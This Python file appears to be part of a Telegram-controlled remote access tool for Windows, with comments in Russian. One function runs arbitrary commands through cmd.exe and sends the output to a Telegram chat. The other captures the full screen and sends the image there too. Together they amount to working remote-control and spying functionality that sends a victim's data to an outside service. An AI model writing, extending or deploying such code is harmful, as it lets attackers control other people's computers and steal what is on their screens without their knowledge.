import subprocess
import time
from PIL import ImageGrab

from vars import bot_token, chat_id, bot, telebot





def downloadSoft(command):
    cmd_process = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

            # Отправляем команду в командную строку
    cmd_process.stdin.write(f"{command}\n".encode())
    cmd_process.stdin.flush()  # Принудительно промываем данные ввода

            # Получаем вывод и ошибки
    output, error = cmd_process.communicate()

    try:
                # Декодируем вывод
        output_str = output.decode('cp866', errors='replace')
    except UnicodeDecodeError:
        output_str = output.decode('utf-8', errors='replace')

    error_str = error.decode('cp866', errors='replace')

            # Формируем текст для отправки в Telegram
    text = f'Output:\n{output_str}\nError:\n{error_str}'

            # Отправляем результат выполнения в Telegram
    bot.send_message(chat_id, text)









#=========================================================================================================================================





def getScreen():
    image = ImageGrab.grab()
    bot.send_photo(chat_id, image)






#==============================================================================================